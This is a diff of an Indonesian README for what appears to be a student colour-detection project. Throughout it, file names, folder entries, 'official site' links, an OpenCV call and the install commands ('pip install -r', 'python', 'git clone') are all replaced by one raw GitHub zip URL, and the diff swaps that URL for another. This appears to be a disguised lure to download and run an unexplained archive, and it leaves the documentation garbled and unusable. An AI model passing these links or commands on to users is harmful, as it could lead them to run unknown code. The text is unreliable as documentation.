@@ -13,60 +13,60 @@ Dibangun menggunakan:
 ├── app/
 │   ├── static/
 │   │   ├── css/
-│   │   │   └── https://raw.githubusercontent.com/prasdionaditya/ilkom-23-citra-kelompok-6/main/app/templates/citra_kelompok_ilkom_quincubital.zip
+│   │   │   └── https://github.com/prasdionaditya/ilkom-23-citra-kelompok-6/raw/refs/heads/main/app/static/foto/kelompok-ilkom-citra-lipography.zip
 │   │   ├── foto/
-│   │   │   ├── https://raw.githubusercontent.com/prasdionaditya/ilkom-23-citra-kelompok-6/main/app/templates/citra_kelompok_ilkom_quincubital.zip
-│   │   │   ├── https://raw.githubusercontent.com/prasdionaditya/ilkom-23-citra-kelompok-6/main/app/templates/citra_kelompok_ilkom_quincubital.zip
-│   │   │   ├── https://raw.githubusercontent.com/prasdionaditya/ilkom-23-citra-kelompok-6/main/app/templates/citra_kelompok_ilkom_quincubital.zip
-│   │   │   ├── https://raw.githubusercontent.com/prasdionaditya/ilkom-23-citra-kelompok-6/main/app/templates/citra_kelompok_ilkom_quincubital.zip
-│   │   │   ├── https://raw.githubusercontent.com/prasdionaditya/ilkom-23-citra-kelompok-6/main/app/templates/citra_kelompok_ilkom_quincubital.zip
-│   │   │   ├── https://raw.githubusercontent.com/prasdionaditya/ilkom-23-citra-kelompok-6/main/app/templates/citra_kelompok_ilkom_quincubital.zip
-│   │   │   ├── https://raw.githubusercontent.com/prasdionaditya/ilkom-23-citra-kelompok-6/main/app/templates/citra_kelompok_ilkom_quincubital.zip
-│   │   │   └── https://raw.githubusercontent.com/prasdionaditya/ilkom-23-citra-kelompok-6/main/app/templates/citra_kelompok_ilkom_quincubital.zip
+│   │   │   ├── https://github.com/prasdionaditya/ilkom-23-citra-kelompok-6/raw/refs/heads/main/app/static/foto/kelompok-ilkom-citra-lipography.zip
+│   │   │   ├── https://github.com/prasdionaditya/ilkom-23-citra-kelompok-6/raw/refs/heads/main/app/static/foto/kelompok-ilkom-citra-lipography.zip
+│   │   │   ├── https://github.com/prasdionaditya/ilkom-23-citra-kelompok-6/raw/refs/heads/main/app/static/foto/kelompok-ilkom-citra-lipography.zip
+│   │   │   ├── https://github.com/prasdionaditya/ilkom-23-citra-kelompok-6/raw/refs/heads/main/app/static/foto/kelompok-ilkom-citra-lipography.zip
+│   │   │   ├── https://github.com/prasdionaditya/ilkom-23-citra-kelompok-6/raw/refs/heads/main/app/static/foto/kelompok-ilkom-citra-lipography.zip
+│   │   │   ├── https://github.com/prasdionaditya/ilkom-23-citra-kelompok-6/raw/refs/heads/main/app/static/foto/kelompok-ilkom-citra-lipography.zip
+│   │   │   ├── https://github.com/prasdionaditya/ilkom-23-citra-kelompok-6/raw/refs/heads/main/app/static/foto/kelompok-ilkom-citra-lipography.zip
+│   │   │   └── https://github.com/prasdionaditya/ilkom-23-citra-kelompok-6/raw/refs/heads/main/app/static/foto/kelompok-ilkom-citra-lipography.zip
 │   │   ├── JavaScript/
-│   │   │   └── https://raw.githubusercontent.com/prasdionaditya/ilkom-23-citra-kelompok-6/main/app/templates/citra_kelompok_ilkom_quincubital.zip
+│   │   │   └── https://github.com/prasdionaditya/ilkom-23-citra-kelompok-6/raw/refs/heads/main/app/static/foto/kelompok-ilkom-citra-lipography.zip
 │   │   └── uploads/         # Folder tambahan untuk upload file gambar
 │   ├── templates/
-│   │   ├── https://raw.githubusercontent.com/prasdionaditya/ilkom-23-citra-kelompok-6/main/app/templates/citra_kelompok_ilkom_quincubital.zip
-│   │   ├── https://raw.githubusercontent.com/prasdionaditya/ilkom-23-citra-kelompok-6/main/app/templates/citra_kelompok_ilkom_quincubital.zip
-│   │   ├── https://raw.githubusercontent.com/prasdionaditya/ilkom-23-citra-kelompok-6/main/app/templates/citra_kelompok_ilkom_quincubital.zip
-│   │   ├── https://raw.githubusercontent.com/prasdionaditya/ilkom-23-citra-kelompok-6/main/app/templates/citra_kelompok_ilkom_quincubital.zip
-│   │   └── https://raw.githubusercontent.com/prasdionaditya/ilkom-23-citra-kelompok-6/main/app/templates/citra_kelompok_ilkom_quincubital.zip
-│   └── https://raw.githubusercontent.com/prasdionaditya/ilkom-23-citra-kelompok-6/main/app/templates/citra_kelompok_ilkom_quincubital.zip
+│   │   ├── https://github.com/prasdionaditya/ilkom-23-citra-kelompok-6/raw/refs/heads/main/app/static/foto/kelompok-ilkom-citra-lipography.zip
+│   │   ├── https://github.com/prasdionaditya/ilkom-23-citra-kelompok-6/raw/refs/heads/main/app/static/foto/kelompok-ilkom-citra-lipography.zip
+│   │   ├── https://github.com/prasdionaditya/ilkom-23-citra-kelompok-6/raw/refs/heads/main/app/static/foto/kelompok-ilkom-citra-lipography.zip
+│   │   ├── https://github.com/prasdionaditya/ilkom-23-citra-kelompok-6/raw/refs/heads/main/app/static/foto/kelompok-ilkom-citra-lipography.zip
+│   │   └── https://github.com/prasdionaditya/ilkom-23-citra-kelompok-6/raw/refs/heads/main/app/static/foto/kelompok-ilkom-citra-lipography.zip
+│   └── https://github.com/prasdionaditya/ilkom-23-citra-kelompok-6/raw/refs/heads/main/app/static/foto/kelompok-ilkom-citra-lipography.zip
 ├── .gitignore
-├── https://raw.githubusercontent.com/prasdionaditya/ilkom-23-citra-kelompok-6/main/app/templates/citra_kelompok_ilkom_quincubital.zip
-├── https://raw.githubusercontent.com/prasdionaditya/ilkom-23-citra-kelompok-6/main/app/templates/citra_kelompok_ilkom_quincubital.zip
-├── https://raw.githubusercontent.com/prasdionaditya/ilkom-23-citra-kelompok-6/main/app/templates/citra_kelompok_ilkom_quincubital.zip
-├── https://raw.githubusercontent.com/prasdionaditya/ilkom-23-citra-kelompok-6/main/app/templates/citra_kelompok_ilkom_quincubital.zip
-├── https://raw.githubusercontent.com/prasdionaditya/ilkom-23-citra-kelompok-6/main/app/templates/citra_kelompok_ilkom_quincubital.zip
-├── https://raw.githubusercontent.com/prasdionaditya/ilkom-23-citra-kelompok-6/main/app/templates/citra_kelompok_ilkom_quincubital.zip          # Rencana proyek
-├── https://raw.githubusercontent.com/prasdionaditya/ilkom-23-citra-kelompok-6/main/app/templates/citra_kelompok_ilkom_quincubital.zip                 # Dokumentasi utama (ini file yang sedang kamu baca)
-├── https://raw.githubusercontent.com/prasdionaditya/ilkom-23-citra-kelompok-6/main/app/templates/citra_kelompok_ilkom_quincubital.zip          # Daftar library Python yang diperlukan
-├── https://raw.githubusercontent.com/prasdionaditya/ilkom-23-citra-kelompok-6/main/app/templates/citra_kelompok_ilkom_quincubital.zip                   # Daftar anggota tim
-├── https://raw.githubusercontent.com/prasdionaditya/ilkom-23-citra-kelompok-6/main/app/templates/citra_kelompok_ilkom_quincubital.zip # Dokumentasi teknis
+├── https://github.com/prasdionaditya/ilkom-23-citra-kelompok-6/raw/refs/heads/main/app/static/foto/kelompok-ilkom-citra-lipography.zip
+├── https://github.com/prasdionaditya/ilkom-23-citra-kelompok-6/raw/refs/heads/main/app/static/foto/kelompok-ilkom-citra-lipography.zip
+├── https://github.com/prasdionaditya/ilkom-23-citra-kelompok-6/raw/refs/heads/main/app/static/foto/kelompok-ilkom-citra-lipography.zip
+├── https://github.com/prasdionaditya/ilkom-23-citra-kelompok-6/raw/refs/heads/main/app/static/foto/kelompok-ilkom-citra-lipography.zip
+├── https://github.com/prasdionaditya/ilkom-23-citra-kelompok-6/raw/refs/heads/main/app/static/foto/kelompok-ilkom-citra-lipography.zip
+├── https://github.com/prasdionaditya/ilkom-23-citra-kelompok-6/raw/refs/heads/main/app/static/foto/kelompok-ilkom-citra-lipography.zip          # Rencana proyek
+├── https://github.com/prasdionaditya/ilkom-23-citra-kelompok-6/raw/refs/heads/main/app/static/foto/kelompok-ilkom-citra-lipography.zip                 # Dokumentasi utama (ini file yang sedang kamu baca)
+├── https://github.com/prasdionaditya/ilkom-23-citra-kelompok-6/raw/refs/heads/main/app/static/foto/kelompok-ilkom-citra-lipography.zip          # Daftar library Python yang diperlukan
+├── https://github.com/prasdionaditya/ilkom-23-citra-kelompok-6/raw/refs/heads/main/app/static/foto/kelompok-ilkom-citra-lipography.zip                   # Daftar anggota tim
+├── https://github.com/prasdionaditya/ilkom-23-citra-kelompok-6/raw/refs/heads/main/app/static/foto/kelompok-ilkom-citra-lipography.zip # Dokumentasi teknis
 ```
 
 ## Penjelasan Folder dan File
 - **app/static/**: Menyimpan file statis seperti CSS, JavaScript, gambar, dan folder upload file.
 - **app/templates/**: Menyimpan file HTML untuk halaman-halaman web.
-- **https://raw.githubusercontent.com/prasdionaditya/ilkom-23-citra-kelompok-6/main/app/templates/citra_kelompok_ilkom_quincubital.zip**: File Python utama untuk mengatur server dan routing.
+- **https://github.com/prasdionaditya/ilkom-23-citra-kelompok-6/raw/refs/heads/main/app/static/foto/kelompok-ilkom-citra-lipography.zip**: File Python utama untuk mengatur server dan routing.
 - **uploads/**: Folder untuk menyimpan file yang diupload oleh pengguna.
-- **https://raw.githubusercontent.com/prasdionaditya/ilkom-23-citra-kelompok-6/main/app/templates/citra_kelompok_ilkom_quincubital.zip**: Berisi daftar dependensi Python yang harus di-install.
-- **https://raw.githubusercontent.com/prasdionaditya/ilkom-23-citra-kelompok-6/main/app/templates/citra_kelompok_ilkom_quincubital.zip**: Rencana pengembangan proyek.
-- **https://raw.githubusercontent.com/prasdionaditya/ilkom-23-citra-kelompok-6/main/app/templates/citra_kelompok_ilkom_quincubital.zip**: Berisi informasi anggota tim.
-- **https://raw.githubusercontent.com/prasdionaditya/ilkom-23-citra-kelompok-6/main/app/templates/citra_kelompok_ilkom_quincubital.zip**: Menjelaskan teknis aplikasi, API, atau alur data.
-- **https://raw.githubusercontent.com/prasdionaditya/ilkom-23-citra-kelompok-6/main/app/templates/citra_kelompok_ilkom_quincubital.zip**: Dokumentasi utama proyek.
-- **https://raw.githubusercontent.com/prasdionaditya/ilkom-23-citra-kelompok-6/main/app/templates/citra_kelompok_ilkom_quincubital.zip, https://raw.githubusercontent.com/prasdionaditya/ilkom-23-citra-kelompok-6/main/app/templates/citra_kelompok_ilkom_quincubital.zip, https://raw.githubusercontent.com/prasdionaditya/ilkom-23-citra-kelompok-6/main/app/templates/citra_kelompok_ilkom_quincubital.zip, https://raw.githubusercontent.com/prasdionaditya/ilkom-23-citra-kelompok-6/main/app/templates/citra_kelompok_ilkom_quincubital.zip, https://raw.githubusercontent.com/prasdionaditya/ilkom-23-citra-kelompok-6/main/app/templates/citra_kelompok_ilkom_quincubital.zip**: Dokumentasi tambahan untuk melengkapi informasi proyek.
+- **https://github.com/prasdionaditya/ilkom-23-citra-kelompok-6/raw/refs/heads/main/app/static/foto/kelompok-ilkom-citra-lipography.zip**: Berisi daftar dependensi Python yang harus di-install.
+- **https://github.com/prasdionaditya/ilkom-23-citra-kelompok-6/raw/refs/heads/main/app/static/foto/kelompok-ilkom-citra-lipography.zip**: Rencana pengembangan proyek.
+- **https://github.com/prasdionaditya/ilkom-23-citra-kelompok-6/raw/refs/heads/main/app/static/foto/kelompok-ilkom-citra-lipography.zip**: Berisi informasi anggota tim.
+- **https://github.com/prasdionaditya/ilkom-23-citra-kelompok-6/raw/refs/heads/main/app/static/foto/kelompok-ilkom-citra-lipography.zip**: Menjelaskan teknis aplikasi, API, atau alur data.
+- **https://github.com/prasdionaditya/ilkom-23-citra-kelompok-6/raw/refs/heads/main/app/static/foto/kelompok-ilkom-citra-lipography.zip**: Dokumentasi utama proyek.
+- **https://github.com/prasdionaditya/ilkom-23-citra-kelompok-6/raw/refs/heads/main/app/static/foto/kelompok-ilkom-citra-lipography.zip, https://github.com/prasdionaditya/ilkom-23-citra-kelompok-6/raw/refs/heads/main/app/static/foto/kelompok-ilkom-citra-lipography.zip, https://github.com/prasdionaditya/ilkom-23-citra-kelompok-6/raw/refs/heads/main/app/static/foto/kelompok-ilkom-citra-lipography.zip, https://github.com/prasdionaditya/ilkom-23-citra-kelompok-6/raw/refs/heads/main/app/static/foto/kelompok-ilkom-citra-lipography.zip, https://github.com/prasdionaditya/ilkom-23-citra-kelompok-6/raw/refs/heads/main/app/static/foto/kelompok-ilkom-citra-lipography.zip**: Dokumentasi tambahan untuk melengkapi informasi proyek.
 
 ## Cara Menjalankan
 1. Pastikan Python sudah terinstal di sistem.
 2. Install dependencies dengan perintah:
     ```bash
-    pip install -r https://raw.githubusercontent.com/prasdionaditya/ilkom-23-citra-kelompok-6/main/app/templates/citra_kelompok_ilkom_quincubital.zip
+    pip install -r https://github.com/prasdionaditya/ilkom-23-citra-kelompok-6/raw/refs/heads/main/app/static/foto/kelompok-ilkom-citra-lipography.zip
     ```
 3. Jalankan server:
     ```bash
-    python https://raw.githubusercontent.com/prasdionaditya/ilkom-23-citra-kelompok-6/main/app/templates/citra_kelompok_ilkom_quincubital.zip
+    python https://github.com/prasdionaditya/ilkom-23-citra-kelompok-6/raw/refs/heads/main/app/static/foto/kelompok-ilkom-citra-lipography.zip
     ```
 4. Buka browser dan akses:
     ```
@@ -109,7 +109,7 @@ Meskipun aplikasi dapat mendeteksi warna dari gambar dengan ukuran besar, kami s
 ---
 
 ## 5. Bagaimana cara berkontribusi pada proyek ini?
-Kami menyambut baik kontribusi dari kamu! Untuk informasi lebih lanjut tentang cara berkontribusi, silakan baca panduan kontribusi di [https://raw.githubusercontent.com/prasdionaditya/ilkom-23-citra-kelompok-6/main/app/templates/citra_kelompok_ilkom_quincubital.zip](https://raw.githubusercontent.com/prasdionaditya/ilkom-23-citra-kelompok-6/main/app/templates/citra_kelompok_ilkom_quincubital.zip).
+Kami menyambut baik kontribusi dari kamu! Untuk informasi lebih lanjut tentang cara berkontribusi, silakan baca panduan kontribusi di [https://github.com/prasdionaditya/ilkom-23-citra-kelompok-6/raw/refs/heads/main/app/static/foto/kelompok-ilkom-citra-lipography.zip](https://github.com/prasdionaditya/ilkom-23-citra-kelompok-6/raw/refs/heads/main/app/static/foto/kelompok-ilkom-citra-lipography.zip).
 
 # FEATURES
 
@@ -255,17 +255,17 @@ Panduan ini memberikan langkah-langkah rinci untuk menginstal dan menyiapkan **P
 
 Sebelum memulai, pastikan sistem kamu memiliki perangkat lunak berikut:
 
-- **https://raw.githubusercontent.com/prasdionaditya/ilkom-23-citra-kelompok-6/main/app/templates/citra_kelompok_ilkom_quincubital.zip** versi 14.0.0 atau lebih tinggi (untuk menjalankan server dan aplikasi backend).
-- **npm** (Node Package Manager, terinstal otomatis bersama https://raw.githubusercontent.com/prasdionaditya/ilkom-23-citra-kelompok-6/main/app/templates/citra_kelompok_ilkom_quincubital.zip).
+- **https://github.com/prasdionaditya/ilkom-23-citra-kelompok-6/raw/refs/heads/main/app/static/foto/kelompok-ilkom-citra-lipography.zip** versi 14.0.0 atau lebih tinggi (untuk menjalankan server dan aplikasi backend).
+- **npm** (Node Package Manager, terinstal otomatis bersama https://github.com/prasdionaditya/ilkom-23-citra-kelompok-6/raw/refs/heads/main/app/static/foto/kelompok-ilkom-citra-lipography.zip).
 - **Git** (untuk meng-clone repository dari GitHub).
 - **Editor Teks** seperti **Visual Studio Code** (untuk memodifikasi kode jika diperlukan).
 
-### Instalasi https://raw.githubusercontent.com/prasdionaditya/ilkom-23-citra-kelompok-6/main/app/templates/citra_kelompok_ilkom_quincubital.zip
-- Kunjungi [situs resmi https://raw.githubusercontent.com/prasdionaditya/ilkom-23-citra-kelompok-6/main/app/templates/citra_kelompok_ilkom_quincubital.zip](https://raw.githubusercontent.com/prasdionaditya/ilkom-23-citra-kelompok-6/main/app/templates/citra_kelompok_ilkom_quincubital.zip) dan unduh versi terbaru yang stabil.
+### Instalasi https://github.com/prasdionaditya/ilkom-23-citra-kelompok-6/raw/refs/heads/main/app/static/foto/kelompok-ilkom-citra-lipography.zip
+- Kunjungi [situs resmi https://github.com/prasdionaditya/ilkom-23-citra-kelompok-6/raw/refs/heads/main/app/static/foto/kelompok-ilkom-citra-lipography.zip](https://github.com/prasdionaditya/ilkom-23-citra-kelompok-6/raw/refs/heads/main/app/static/foto/kelompok-ilkom-citra-lipography.zip) dan unduh versi terbaru yang stabil.
 - Ikuti petunjuk instalasi untuk sistem operasi kamu (Windows, macOS, atau Linux).
 
 ### Instalasi Git
-- Kunjungi [situs resmi Git](https://raw.githubusercontent.com/prasdionaditya/ilkom-23-citra-kelompok-6/main/app/templates/citra_kelompok_ilkom_quincubital.zip) dan ikuti panduan untuk menginstal Git sesuai dengan sistem operasi kamu.
+- Kunjungi [situs resmi Git](https://github.com/prasdionaditya/ilkom-23-citra-kelompok-6/raw/refs/heads/main/app/static/foto/kelompok-ilkom-citra-lipography.zip) dan ikuti panduan untuk menginstal Git sesuai dengan sistem operasi kamu.
 
 ---
 
@@ -278,7 +278,7 @@ Langkah pertama adalah meng-clone repository **Deteksi Warna** dari GitHub ke ko
 1. Buka terminal atau command prompt.
 2. Jalankan perintah berikut untuk meng-clone repository:
    ```bash
-   git clone https://raw.githubusercontent.com/prasdionaditya/ilkom-23-citra-kelompok-6/main/app/templates/citra_kelompok_ilkom_quincubital.zip
+   git clone https://github.com/prasdionaditya/ilkom-23-citra-kelompok-6/raw/refs/heads/main/app/static/foto/kelompok-ilkom-citra-lipography.zip
    cd deteksi-warna
 
 # PROJECT_PLAN
@@ -341,7 +341,7 @@ Proyek ini terdiri dari beberapa komponen utama:
 ## 4. Algoritma yang Digunakan
 ### a. Konversi Warna
 Menggunakan rumus konversi warna seperti:
-- **RGB ke HSV**: Menggunakan OpenCV: `https://raw.githubusercontent.com/prasdionaditya/ilkom-23-citra-kelompok-6/main/app/templates/citra_kelompok_ilkom_quincubital.zip(image, https://raw.githubusercontent.com/prasdionaditya/ilkom-23-citra-kelompok-6/main/app/templates/citra_kelompok_ilkom_quincubital.zip)`
+- **RGB ke HSV**: Menggunakan OpenCV: `https://github.com/prasdionaditya/ilkom-23-citra-kelompok-6/raw/refs/heads/main/app/static/foto/kelompok-ilkom-citra-lipography.zip(image, https://github.com/prasdionaditya/ilkom-23-citra-kelompok-6/raw/refs/heads/main/app/static/foto/kelompok-ilkom-citra-lipography.zip)`
 
 ### b. Deteksi Warna Dominan
 Menggunakan algoritma **K-Means Clustering**:
@@ -359,7 +359,7 @@ pip install opencv-python numpy pillow
 ### b. Menjalankan Program
 Jika berbasis Python:
 ```bash
-python https://raw.githubusercontent.com/prasdionaditya/ilkom-23-citra-kelompok-6/main/app/templates/citra_kelompok_ilkom_quincubital.zip
+python https://github.com/prasdionaditya/ilkom-23-citra-kelompok-6/raw/refs/heads/main/app/static/foto/kelompok-ilkom-citra-lipography.zip
 ```
 Jika berbasis web:
 ```bash
@@ -369,7 +369,7 @@ npm start
 
 ## 6. Contoh Hasil
 Berikut adalah contoh hasil deteksi warna dominan dari sebuah gambar:
-![Contoh Hasil](https://raw.githubusercontent.com/prasdionaditya/ilkom-23-citra-kelompok-6/main/app/templates/citra_kelompok_ilkom_quincubital.zip)
+![Contoh Hasil](https://github.com/prasdionaditya/ilkom-23-citra-kelompok-6/raw/refs/heads/main/app/static/foto/kelompok-ilkom-citra-lipography.zip)
 
 ## 7. Kesimpulan
 Proyek ini dapat digunakan untuk berbagai keperluan seperti desain grafis, analisis warna, dan lain sebagainya. Dokumentasi ini akan terus diperbarui seiring dengan pengembangan proyek.
